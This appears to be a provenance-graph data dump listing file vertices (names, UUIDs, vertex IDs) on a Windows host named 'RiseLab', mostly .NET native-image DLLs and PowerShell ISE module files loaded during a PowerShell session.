+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.Pd3efef62#\\f0e47813e3d36352e9d66266541a1926\\Microsoft.PowerShell.ISECommon.ni.dll.aux
+Key: uuid, Value: A0C54A9E-2757-4C04-889C-2E9B80D8BB63
+Vertex ID: 45491
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\0c9bec7e4e969db233900a4588c91656\\System.ni.dll.aux
+Key: uuid, Value: 1297D5B9-7EC2-4369-A6FA-8166AC976809
+Vertex ID: 46152
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Windows.Forms\\521c34e277f9c9e0fc16511eaf6a448e\\System.Windows.Forms.ni.dll.aux
+Key: uuid, Value: 025FEE96-69B9-40EA-8CAB-95F894A97204
+Vertex ID: 46151
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Drawing\\11b6df208a28a7e6c1011a50101e923d\\System.Drawing.ni.dll.aux
+Key: uuid, Value: 901F791D-E1BC-4C52-90FE-497054C494C1
+Vertex ID: 46037
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\c915ae5824457d3a69c36be12252eeff\\System.Management.Automation.ni.dll.aux
+Key: uuid, Value: 115F7A73-4625-47CA-B106-EEC7AE9E3807
+Vertex ID: 45493
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Core\\88dea3dcba1b28955a1a9346e1f346a2\\System.Core.ni.dll.aux
+Key: uuid, Value: 4D836764-5B89-4D45-911D-15FAD01B0847
+Vertex ID: 15248
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Windows.Forms\\521c34e277f9c9e0fc16511eaf6a448e\\System.Windows.Forms.ni.dll
+Key: uuid, Value: 18B6CA6A-DBA3-41E7-B9A7-9A6D748DC1A6
+Vertex ID: 15254
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\mscorlib\\8a9c7ab28dfd1baa08e20283667c4c7e\\mscorlib.ni.dll
+Key: uuid, Value: 367CB473-B4C5-4524-94FB-306BB3E8A53B
+Vertex ID: 15245
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\0c9bec7e4e969db233900a4588c91656\\System.ni.dll
+Key: uuid, Value: C328F0FE-DCA9-4FF7-A8D5-B660B04E9750
+Vertex ID: 15251
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Drawing\\11b6df208a28a7e6c1011a50101e923d\\System.Drawing.ni.dll
+Key: uuid, Value: 3E52FDA6-05C8-47C8-9406-593100F672A8
+Vertex ID: 46039
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Configuration\\56f24a797ee3c2a1b9653c5eaa0a664c\\System.Configuration.ni.dll.aux
+Key: uuid, Value: F807A927-45E9-4F53-8A08-FE925930A1D3
+Vertex ID: 46040
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Xml\\7260601a8e387f3dc0dec66fc8855067\\System.Xml.ni.dll.aux
+Key: uuid, Value: 7E7D1050-9A1A-4D66-986C-3EBAFF7B31A0
+Vertex ID: 2101
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\WinSxS\\amd64_microsoft.windows.gdiplus_6595b64144ccf1df_1.1.16299.125_none_46b6c26dedf485d7\\GdiPlus.dll
+Key: uuid, Value: 85D8147A-DB90-423E-B5EA-54A8F98CEBBF
+Vertex ID: 46575
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.P0e11b656#\\5e7d615bfbe679d89ecbeee9dc9ebe7b\\Microsoft.PowerShell.GPowerShell.ni.dll.aux
+Key: uuid, Value: 3E2D503A-39C9-40D4-A21D-2CE76F46EACB
+Vertex ID: 46576
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.P0e11b656#\\5e7d615bfbe679d89ecbeee9dc9ebe7b\\Microsoft.PowerShell.GPowerShell.ni.dll
+Key: uuid, Value: 050BD7CB-A962-4F68-A2DE-FD63AF8142CD
+Vertex ID: 338842
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\Microsoft.NET\\assembly\\GAC_MSIL\\System.ComponentModel.Composition\\v4.0_4.0.0.0__b77a5c561934e089\\System.ComponentModel.Composition.dll
+Key: uuid, Value: 7E0812A6-451B-4140-94E4-3CB32FB30AB1
+Vertex ID: 46582
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.P10d01611#\\70b4cab4e2d54559cf6d8f51487f4369\\Microsoft.PowerShell.Editor.ni.dll.aux
+Key: uuid, Value: 915BD384-29A4-4703-B6DE-76BE205459DC
+Vertex ID: 46586
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.P10d01611#\\70b4cab4e2d54559cf6d8f51487f4369\\Microsoft.PowerShell.Editor.ni.dll
+Key: uuid, Value: 60D14AE1-2264-4E27-BAC8-818FB04FDAE3
+Vertex ID: 15263
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Core\\88dea3dcba1b28955a1a9346e1f346a2\\System.Core.ni.dll
+Key: uuid, Value: E952479D-0963-4FBC-A68C-6BF50CB65DDA
+Vertex ID: 15341
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Configuration\\56f24a797ee3c2a1b9653c5eaa0a664c\\System.Configuration.ni.dll
+Key: uuid, Value: 7ED42A76-D98F-481C-945A-7D756D6F139F
+Vertex ID: 15277
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Xml\\7260601a8e387f3dc0dec66fc8855067\\System.Xml.ni.dll
+Key: uuid, Value: 2C112CF3-E102-4DBD-972C-78DD45AFB401
+Vertex ID: 47380
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\WindowsBase\\097e2323c85eafa046d1e6c5135e84df\\WindowsBase.ni.dll.aux
+Key: uuid, Value: 2FC1B1A6-8084-4023-9ECC-7B222E8245C4
+Vertex ID: 47415
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\WindowsBase\\097e2323c85eafa046d1e6c5135e84df\\WindowsBase.ni.dll
+Key: uuid, Value: C7D569BA-C929-4510-B4A9-32861C24BA38
+Vertex ID: 47130
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Presentatio5ae0f00f#\\de42d5cf20a20f3b2115b87d7d2cf997\\PresentationFramework.ni.dll.aux
+Key: uuid, Value: 3A77B120-AD02-4D65-B26D-0E72F51B0413
+Vertex ID: 47166
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\PresentationCore\\e16c1658c8bb22ead63dd70f66cc27bc\\PresentationCore.ni.dll.aux
+Key: uuid, Value: 15C00A35-27D8-4E90-92FE-62B6DBFCC159
+Vertex ID: 47219
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\PresentationCore\\e16c1658c8bb22ead63dd70f66cc27bc\\PresentationCore.ni.dll
+Key: uuid, Value: 248D3D88-D0F2-4CA3-A7B3-B0CEE0BE26D0
+Vertex ID: 47191
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Presentatio5ae0f00f#\\de42d5cf20a20f3b2115b87d7d2cf997\\PresentationFramework.ni.dll
+Key: uuid, Value: 04596220-8DC7-4318-946E-A28FB8157E15
+Vertex ID: 47316
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Xaml\\5f6c34b004385b478fa3a7539677049a\\System.Xaml.ni.dll.aux
+Key: uuid, Value: DDA4904E-FCF1-4238-9D01-557C920AE4C4
+Vertex ID: 47382
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Xaml\\5f6c34b004385b478fa3a7539677049a\\System.Xaml.ni.dll
+Key: uuid, Value: 1196EA70-BC31-4A8F-BBAB-A31F2928C503
+Vertex ID: 47292
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Runteb92aa12#\\bbf894e2bc0849837606e4208f627710\\System.Runtime.Serialization.ni.dll.aux
+Key: uuid, Value: 06902885-6B75-44E5-BA7D-B7CA8234C12D
+Vertex ID: 47294
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Runteb92aa12#\\bbf894e2bc0849837606e4208f627710\\System.Runtime.Serialization.ni.dll
+Key: uuid, Value: F71B406E-675B-4D95-81E0-3D0EE8EB0F55
+Vertex ID: 338843
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\Microsoft.NET\\assembly\\GAC_MSIL\\UIAutomationProvider\\v4.0_4.0.0.0__31bf3856ad364e35\\UIAutomationProvider.dll
+Key: uuid, Value: 1A5D96A8-F21A-498E-9246-B77259E0C3CD
+Vertex ID: 46179
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Accessibility\\5bf6cf17dd7b6597c5e6f0fbae3edb8e\\Accessibility.ni.dll.aux
+Key: uuid, Value: BC99EBE7-A4F6-416C-9EF1-2E599929B6DB
+Vertex ID: 46183
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Accessibility\\5bf6cf17dd7b6597c5e6f0fbae3edb8e\\Accessibility.ni.dll
+Key: uuid, Value: D384D9CB-3818-40C1-94DC-4072EBDA6C28
+Vertex ID: 338840
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\Microsoft.NET\\assembly\\GAC_MSIL\\UIAutomationTypes\\v4.0_4.0.0.0__31bf3856ad364e35\\UIAutomationTypes.dll
+Key: uuid, Value: 13F0D222-9F93-498C-951A-2FBE18C4552B
+Vertex ID: 338873
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\WPF\\wpfgfx_v0400.dll
+Key: uuid, Value: 09E36AC0-C9F9-437F-A192-FFC6D4D4A340
+Vertex ID: 338874
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\msvcp120_clr0400.dll
+Key: uuid, Value: DCF42E96-A85E-4939-AEA6-69BD7F400690
+Vertex ID: 8714
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\msvcr120_clr0400.dll
+Key: uuid, Value: 3AB15BE3-D60C-4E29-B118-CEC0AA744A97
+Vertex ID: 338875
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\WPF\\PresentationNative_v0400.dll
+Key: uuid, Value: 0C0B5FB6-5AF6-40B3-B918-6E3BDD281BB9
+Vertex ID: 192285
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\$Extend\\$UsnJrnl:$J
+Key: uuid, Value: FAAAED64-8C63-4F56-AAE9-3C5DAA83FDD2
+Vertex ID: 45494
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Management\\ace81fc29ee797953e01b4d1432bf7b9\\System.Management.ni.dll.aux
+Key: uuid, Value: 4A7B317E-7301-4D68-8199-73CBC9A09EF4
+Vertex ID: 46172
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Dired13b18a9#\\0477afcfdccc24502c8e79e7f6ce45c7\\System.DirectoryServices.ni.dll.aux
+Key: uuid, Value: 4B899FF0-2033-4A1B-950E-770DF55AA4AB
+Vertex ID: 46400
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.Mf49f6405#\\752c4b8efdfb6ebd5f1be8cedbb40d13\\Microsoft.Management.Infrastructure.ni.dll.aux
+Key: uuid, Value: 3C12915F-642B-4DA7-B5E5-A0F27AC4EBFB
+Vertex ID: 338880
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\WPF\\Fonts\\GlobalUserInterface.CompositeFont
+Key: uuid, Value: 998F20C6-3180-424E-954B-CD45562B3B6E
+Vertex ID: 338881
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\WPF\\Fonts\\GlobalMonospace.CompositeFont
+Key: uuid, Value: 8C9FC19F-5018-4D85-BEB4-DA89FA38C621
+Vertex ID: 338882
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\WPF\\Fonts\\GlobalSansSerif.CompositeFont
+Key: uuid, Value: 7C4C89DD-BDA2-46CB-B13D-B01CCA3E3B43
+Vertex ID: 338883
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\WPF\\Fonts\\GlobalSerif.CompositeFont
+Key: uuid, Value: 4071EC1C-6E06-4BB8-A724-685AAC0C3726
+Vertex ID: 338884
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\d3d9.dll
+Key: uuid, Value: 43367669-1201-4EA4-8414-0CBC10CE96B0
+Vertex ID: 2072
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\d3d10warp.dll
+Key: uuid, Value: 9257C433-02A9-4330-8B5C-E9BB05F4C8BC
+Vertex ID: 47139
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Presentatioaec034ca#\\ba276ced9946f8c75ae9dfe18a87ddf0\\PresentationFramework.Aero2.ni.dll.aux
+Key: uuid, Value: 0A904440-0DBB-47DE-9FAF-05842FB42577
+Vertex ID: 47214
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Presentatioaec034ca#\\ba276ced9946f8c75ae9dfe18a87ddf0\\PresentationFramework.Aero2.ni.dll
+Key: uuid, Value: 4E7366B6-3142-48C1-9CE1-EA9CBCA42963
+Vertex ID: 338887
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\Microsoft.NET\\assembly\\GAC_MSIL\\PresentationFramework-SystemXml\\v4.0_4.0.0.0__b77a5c561934e089\\PresentationFramework-SystemXml.dll
+Key: uuid, Value: F78B8BD7-4F8E-4EBA-B01F-A0B87260E706
+Vertex ID: 46171
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Data\\ff8be0205712994dd25d2ee2a9610693\\System.Data.ni.dll.aux
+Key: uuid, Value: 3758DAC0-F8C3-458B-AF20-4AAD64ADDD90
+Vertex ID: 46121
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\Microsoft.NET\\assembly\\GAC_64\\System.Data\\v4.0_4.0.0.0__b77a5c561934e089\\System.Data.dll
+Key: uuid, Value: F5D08D0A-7B03-4308-81B4-5FEF55124CE6
+Vertex ID: 46169
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.P6f792626#\\5e132857f6f38c1de39f5429f3691a04\\Microsoft.PowerShell.Security.ni.dll.aux
+Key: uuid, Value: 88816DDE-A563-406D-B4BD-8C3ECA6AC828
+Vertex ID: 46173
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Transactions\\5481c4ed3ac45c6df98b0c169f66cc57\\System.Transactions.ni.dll.aux
+Key: uuid, Value: 8799888A-B34E-4F7B-B359-5688D0257C87
+Vertex ID: 46150
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Numerics\\f0215d4d9a67d23d8769d37aede1226f\\System.Numerics.ni.dll.aux
+Key: uuid, Value: 9300461F-A183-43FD-BA37-484ED4F50D4B
+Vertex ID: 46699
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.Pcd26229b#\\eb19136c796435fbc0c63f8de20a0708\\Microsoft.PowerShell.GraphicalHost.ni.dll.aux
+Key: uuid, Value: 79E1444A-997A-4087-BDC9-639F72A8E68A
+Vertex ID: 46700
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.Pcd26229b#\\eb19136c796435fbc0c63f8de20a0708\\Microsoft.PowerShell.GraphicalHost.ni.dll
+Key: uuid, Value: 53782A0F-8E28-4988-BAD9-3A8ED9452775
+Vertex ID: 2416
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsCodecs.dll
+Key: uuid, Value: AA5A08CA-844E-457C-9F6B-8E45A30637ED
+Vertex ID: 338891
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\Microsoft.NET\\assembly\\GAC_MSIL\\PresentationFramework-SystemData\\v4.0_4.0.0.0__b77a5c561934e089\\PresentationFramework-SystemData.dll
+Key: uuid, Value: E6B325E2-7FBC-4E52-84AD-B4FC2FD3FEA6
+Vertex ID: 180452
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Data\\ff8be0205712994dd25d2ee2a9610693\\System.Data.ni.dll
+Key: uuid, Value: D4B8321A-875C-4DC4-84F4-BA9A49359126
+Vertex ID: 338892
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\Microsoft.NET\\assembly\\GAC_MSIL\\PresentationFramework-SystemCore\\v4.0_4.0.0.0__b77a5c561934e089\\PresentationFramework-SystemCore.dll
+Key: uuid, Value: 534E36AE-2B1D-467B-B71D-5EFF8852D847
+Vertex ID: 2837
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\D3DCompiler_47.dll
+Key: uuid, Value: 53D87312-100D-4458-A218-40200FC5B1DC
+Vertex ID: 180450
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Transactions\\5481c4ed3ac45c6df98b0c169f66cc57\\System.Transactions.ni.dll
+Key: uuid, Value: 81B0E06E-3093-48DC-BBC5-5E9EDB5A9BB6
+Vertex ID: 8237
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\clr.dll
+Key: uuid, Value: 34AAFA2D-EFAF-4840-88AE-3AACBFCEFEA9
+Vertex ID: 2458
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WinMetadata\\Windows.UI.winmd
+Key: uuid, Value: 23E12D12-733E-4210-B989-8AD40CF6FEA3
+Vertex ID: 338899
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\Microsoft.NET\\assembly\\GAC_MSIL\\System.Runtime.InteropServices.WindowsRuntime\\v4.0_4.0.0.0__b03f5f7f11d50a3a\\System.Runtime.InteropServices.WindowsRuntime.dll
+Key: uuid, Value: 272D484B-796F-48D2-AF6D-A894DD98F7C6
+Vertex ID: 47248
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Runt0d283adf#\\21e0f4e63dafaf9ff26cff7197e548a8\\System.Runtime.WindowsRuntime.ni.dll.aux
+Key: uuid, Value: F04EA63C-562D-48B3-8FDC-FE1868C1D024
+Vertex ID: 47252
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Runt0d283adf#\\21e0f4e63dafaf9ff26cff7197e548a8\\System.Runtime.WindowsRuntime.ni.dll
+Key: uuid, Value: 74184D1D-8D5E-4FED-AB9B-27DA5FBA1478
+Vertex ID: 2383
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\twinapi.dll
+Key: uuid, Value: D0D6E8DB-E444-466D-8A32-AC1AB33F71A3
+Vertex ID: 338902
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Users\\admin\\AppData\\Local\\Temp\\__PSScriptPolicyTest_kpoysqfx.43p.ps1
+Key: uuid, Value: C64A1518-EE47-4E8D-9407-2BF5E3AA8C73
+Vertex ID: 338904
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\ISE\\ise.psd1
+Key: uuid, Value: 810F43BB-5431-4B0F-B22D-666FFA09B9CE
+Vertex ID: 338906
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\CatRoot\\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}\\Microsoft-Windows-Client-Features-Package00112~31bf3856ad364e35~amd64~~10.0.16299.15.cat
+Key: uuid, Value: 9DE14542-0765-4216-9D9E-FFD1C88F8A77
+Vertex ID: 338907
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\ISE\\ise.psm1
+Key: uuid, Value: 7668C4A8-E6C4-4246-A0B9-32BB0B68BCE3
+Vertex ID: 338908
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Program Files\\WindowsPowerShell\\Modules\\Microsoft.PowerShell.Operation.Validation\\1.0.1\\Microsoft.PowerShell.Operation.Validation.psd1
+Key: uuid, Value: A2F4F129-DBF8-40C7-8082-85F0D6FCD4E3
+Vertex ID: 338909
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Program Files\\WindowsPowerShell\\Modules\\PackageManagement\\1.0.0.1\\PackageManagement.psd1
+Key: uuid, Value: 7AB971C5-E5C3-4A60-8913-08A9D698DFD5
+Vertex ID: 338910
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
